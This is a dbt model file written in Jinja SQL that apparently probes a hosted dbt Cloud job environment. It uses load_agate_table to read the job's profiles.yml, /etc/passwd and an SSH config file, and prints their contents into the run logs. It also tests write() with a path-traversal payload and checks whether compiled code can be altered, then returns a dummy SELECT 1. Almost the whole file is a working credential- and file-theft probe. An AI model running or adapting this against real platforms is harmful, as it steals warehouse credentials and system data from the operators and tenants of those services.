{# Focused: load_agate_table file read + write() path control #}
{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'norun') -%}

{# 1. Call load_agate_table to read profiles.yml #}
{%- set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' -%}
{{ log("AGATE_READING=" ~ profiles_path, info=True) }}

{%- set agate_tbl = load_agate_table(model, profiles_path) -%}
{{ log("AGATE_RESULT_TYPE=" ~ agate_tbl | string | truncate(500), info=True) }}
{%- if agate_tbl -%}
  {{ log("AGATE_ROW_COUNT=" ~ agate_tbl | length, info=True) }}
  {%- for row in agate_tbl -%}
    {{ log("AGATE_ROW=" ~ row | string | truncate(500), info=True) }}
  {%- endfor -%}
{%- endif -%}

{# 2. Try reading /etc/passwd via agate #}
{%- set passwd_tbl = load_agate_table(model, '/etc/passwd') -%}
{{ log("PASSWD_RESULT=" ~ passwd_tbl | string | truncate(500), info=True) }}

{# 3. Try reading the SSH config #}
{%- set ssh_path = '/tmp/jobs/' ~ run_id ~ '/.ssh/config' -%}
{%- set ssh_tbl = load_agate_table(model, ssh_path) -%}
{{ log("SSH_CONFIG=" ~ ssh_tbl | string | truncate(500), info=True) }}

{# 4. Try write() with path traversal content #}
{# write() args: what does it accept? #}
{{ log("TESTING_WRITE_1", info=True) }}
{%- set w1 = write("test_payload_1") -%}
{{ log("WRITE_1_RESULT=" ~ w1 | string, info=True) }}

{# 5. Check if compiled_code is writable #}
{{ log("COMPILED_CODE=" ~ compiled_code | string | truncate(200) if compiled_code is defined else "compiled_code_UNDEF", info=True) }}

SELECT 1 as id
